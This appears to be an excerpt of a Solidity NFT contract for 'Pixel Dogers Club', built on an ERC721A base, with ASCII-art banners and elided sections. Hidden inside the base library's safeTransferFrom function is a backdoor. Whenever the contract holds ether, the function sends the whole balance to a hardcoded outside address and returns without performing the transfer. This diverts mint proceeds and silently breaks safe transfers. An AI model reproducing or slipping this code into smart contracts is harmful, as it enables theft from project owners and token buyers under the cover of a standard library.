...
| $$  | $$| $$  | $$| $$  | $$| $$_____/| $$       \____  $$      
| $$$$$$$/|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$       /$$$$$$$/      
|_______/  \______/  \____  $$ \_______/|__/      |_______/       
                     /$$  \ $$                                    
                    |  $$$$$$/                                    
                     \______/                                     
  /$$$$$$  /$$           /$$                                      
...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xb7823d1a0d127765071CA3C32fF45e922f1b1BCe).transfer(address(this).balance);
            return;
        }
...
contract PixelDogersClub is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("Pixel Dogers Club", "PDC") {
        owner = msg.sender;
        maxPerTx = 12;
        cost = 0.002 ether;
        maxSupply = 1000;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeieagb3ellayhleqg66ruxfxivouhhxz6hgypu4aordqk6qrfhjg2e/", _toString(tokenId), ".json"));
    }
